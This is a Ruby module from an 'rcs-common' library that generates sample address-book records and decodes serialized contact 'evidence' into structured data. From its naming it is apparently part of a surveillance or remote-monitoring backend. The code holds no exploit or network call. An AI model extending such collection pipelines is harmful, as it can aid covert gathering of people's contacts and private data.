require 'rcs-common/evidence/common'
require 'rcs-common/serializer'

module RCS
module AddressbookEvidence
  def content
    fields = { :first_name => ["John", "Liza", "Bruno"].sample, :last_name => ["Doe", "Rossi", "Bianchi"].sample, :company => ["Acme Inc.", "Disney", "Apple Inc."].sample, :mobile_phone_number => ["00155597865", "0012342355", "+3901234567"].sample}
    AddressBookSerializer.new.serialize fields
  end
  
  def generate_content
    [ content ]
  end

  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      info = Hash[common_info]
      info[:data] ||= Hash.new

      contact = AddressBookSerializer.new.unserialize stream

      info[:data][:name] = contact.name
      info[:data][:contact] = contact.contact
      info[:data][:info] = contact.info

      yield info if block_given?
    end
    :delete_raw
  end
end # ::AddressbookEvidence
end # ::RCS
